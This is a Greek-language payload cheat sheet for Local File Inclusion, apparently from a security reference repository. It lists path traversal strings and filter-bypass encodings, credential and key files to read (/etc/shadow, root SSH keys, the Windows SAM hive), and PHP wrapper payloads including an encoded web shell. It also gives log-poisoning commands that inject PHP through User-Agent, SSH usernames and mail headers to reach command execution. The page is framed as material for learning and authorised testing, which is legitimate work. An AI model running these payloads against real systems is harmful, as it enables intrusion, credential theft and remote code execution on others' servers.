# 📂 Συλλογή δοκιμαστικών εισόδων LFI

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../LFI.md) • [🇹🇷 Türkçe Sürüm](LFI.tr.md)

```
  ██╗     ███████╗██╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ██║     ██╔════╝██║    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
  ██║     █████╗  ██║    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
  ██║     ██╔══╝  ██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ███████╗██║     ██║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚══════╝╚═╝     ╚═╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## Πριν ξεκινήσετε

Το **LFI (Local File Inclusion)** αφορά την ανεπαρκώς περιορισμένη επιλογή τοπικού αρχείου που συμπεριλαμβάνει μια εφαρμογή. Το **path traversal** είναι η έξοδος από τον προβλεπόμενο κατάλογο μέσω διαδρομών όπως ../. Η ανάγνωση αρχείου και η εκτέλεση του περιεχομένου του είναι διαφορετικές δυνατότητες.

Οι διαδρομές είναι ενδεικτικές και η πρόσβαση εξαρτάται από το λειτουργικό, τα δικαιώματα και τον τρόπο χρήσης της εισόδου. Τα **wrappers** της PHP είναι μηχανισμοί πρόσβασης σε ροές· δεν εγγυώνται εκτέλεση κώδικα. Μελετήστε τις προϋποθέσεις πριν συνδέσετε διαφορετικές τεχνικές.

<a id="section-01"></a>

## 🐧 Αρχεία Linux

### Βασική μετακίνηση σε γονικούς καταλόγους
```
/etc/passwd
../etc/passwd
../../etc/passwd
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
../../../../../../etc/passwd
../../../../../../../etc/passwd
../../../../../../../../etc/passwd
```

### Με κωδικοποίηση URL
```
..%2F..%2F..%2F..%2Fetc%2Fpasswd
..%252F..%252F..%252Fetc%252Fpasswd
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd
%252e%252e%252f%252e%252e%252fetc%252fpasswd
```

### Παραδείγματα παράκαμψης του πρωτοτύπου και περιορισμοί
```
....//....//....//etc/passwd
..././..././..././etc/passwd
....\/....\/....\/etc/passwd
..%c0%af..%c0%afetc/passwd
..%ef%bc%8f..%ef%bc%8fetc/passwd
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd%00.php
```

### Αρχεία Linux που παρουσιάζουν ενδιαφέρον
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/group
/etc/resolv.conf
/etc/crontab
/etc/ssh/sshd_config
/etc/ssh/ssh_config
/etc/apache2/apache2.conf
/etc/nginx/nginx.conf
/etc/mysql/my.cnf
/proc/self/environ
/proc/self/cmdline
/proc/self/fd/0
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/auth.log
/var/log/syslog
/home/user/.ssh/id_rsa
/home/user/.bash_history
/root/.bash_history
/root/.ssh/id_rsa
```

---

<a id="section-02"></a>

## 🪟 Αρχεία Windows

### Βασική μετακίνηση σε γονικούς καταλόγους
```
C:\Windows\System32\drivers\etc\hosts
C:/Windows/System32/drivers/etc/hosts
..\..\..\..\Windows\System32\drivers\etc\hosts
....\\....\\....\\Windows\\System32\\drivers\\etc\\hosts
```

### Αρχεία Windows που παρουσιάζουν ενδιαφέρον
```
C:\Windows\System32\config\SAM
C:\Windows\System32\config\SYSTEM
C:\Windows\System32\config\SECURITY
C:\Windows\repair\SAM
C:\Windows\repair\SYSTEM
C:\Windows\win.ini
C:\Windows\system.ini
C:\boot.ini
C:\inetpub\logs\LogFiles
C:\inetpub\wwwroot\web.config
C:\xampp\apache\conf\httpd.conf
C:\xampp\php\php.ini
C:\Program Files\FileZilla Server\FileZilla Server.xml
```

---

<a id="section-03"></a>

## 🔄 Wrappers PHP — μηχανισμοί πρόσβασης σε ροές

> **Προϋποθέσεις PHP:** Ανάγνωση μέσω filter δεν ταυτίζεται με εκτέλεση. Τα input/data/expect/zip/phar εξαρτώνται από επιτρεπόμενες λειτουργίες, επεκτάσεις, ρυθμίσεις και έκδοση. Τα null-byte και παλιά μοτίβα traversal του πρωτοτύπου δεν είναι καθολικά αποτελεσματικά.


### php://filter — ανάγνωση πηγαίου κώδικα
```
php://filter/convert.base64-encode/resource=index.php
php://filter/read=string.rot13/resource=index.php
php://filter/convert.iconv.utf-8.utf-16/resource=index.php
php://filter/read=convert.base64-encode/resource=../config.php
```

### php://input — προϋποθέσεις εκτέλεσης κώδικα
```
php://input
POST: <?php system('id'); ?>
```

### Μηχανισμός data://
```
data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
data://text/plain,<?php system($_GET['cmd']); ?>
```

### expect:// — προϋποθέσεις εκτέλεσης εντολών
```
expect://id
expect://whoami
```

### Μηχανισμός zip://
```
zip://path/to/file.zip%23shell.php
```

### Μηχανισμός phar://
```
phar://uploads/shell.jpg/test.php
```

---

<a id="section-04"></a>

## 🔥 Εισαγωγή κώδικα σε logs και προϋποθέσεις RCE

> **Αλυσίδα πολλών προϋποθέσεων:** Πρέπει η τιμή να καταγραφεί, το αρχείο να είναι προσβάσιμο και η συμπερίληψη να ερμηνεύει κώδικα. Η ανάγνωση log δεν αποδεικνύει RCE. Η διεύθυνση και η μορφή logs διαφέρουν ανά εγκατάσταση.


### Αρχείο καταγραφής προσβάσεων Apache
```bash
# 1. Εισαγωγή PHP μέσω User-Agent
curl -A "<?php system(\$_GET['cmd']); ?>" http://target.com/

# 2. Συμπερίληψη αρχείου καταγραφής
?page=/var/log/apache2/access.log&cmd=id
```

### Αρχείο καταγραφής SSH
```bash
# 1. Εισαγωγή μέσω SSH
ssh '<?php system($_GET["cmd"]);?>'@target.com

# 2. Συμπερίληψη καταγραφής
?page=/var/log/auth.log&cmd=id
```

### Αρχείο καταγραφής αλληλογραφίας
```bash
# 1. Αποστολή μηνύματος με δοκιμαστικό περιεχόμενο
mail -s "<?php system(\$_GET['cmd']); ?>" target@localhost

# 2. Συμπερίληψη καταγραφής
?page=/var/log/mail.log&cmd=id
```

### Περιβάλλον διεργασίας μέσω proc
```
?page=/proc/self/environ
# User-Agent: <?php system('id'); ?>
```

---

<a id="section-05"></a>

## 📊 Γρήγορη αναφορά

### Ανίχνευση
```
?page=../../../etc/passwd
?file=....//....//etc/passwd
?path=/etc/passwd%00
```

### Παραλλαγές για έλεγχο φίλτρων
| Φίλτρο | Ενδεικτική προσέγγιση του πρωτοτύπου |
| -------- | -------- |
| Φιλτράρεται το `../` | `....//`, `..././` |
| Απαιτείται `.php` | `%00`, null byte — εξαρτάται από έκδοση και επεξεργασία |
| Λίστα επιτρεπόμενων τιμών | Μηχανισμοί php:// |

### Συνήθεις παράμετροι
```
page, file, path, include, doc
document, folder, root, pg, style
template, view, content, load
```

---

<a id="section-06"></a>

## 📚 Πηγές

- [PayloadsAllTheThings LFI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion)
- [HackTricks LFI](https://book.hacktricks.xyz/pentesting-web/file-inclusion)

---

<p align="center">
  <b>📂 Συλλογή δοκιμαστικών εισόδων LFI</b><br>
  <i>Για μάθηση και εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
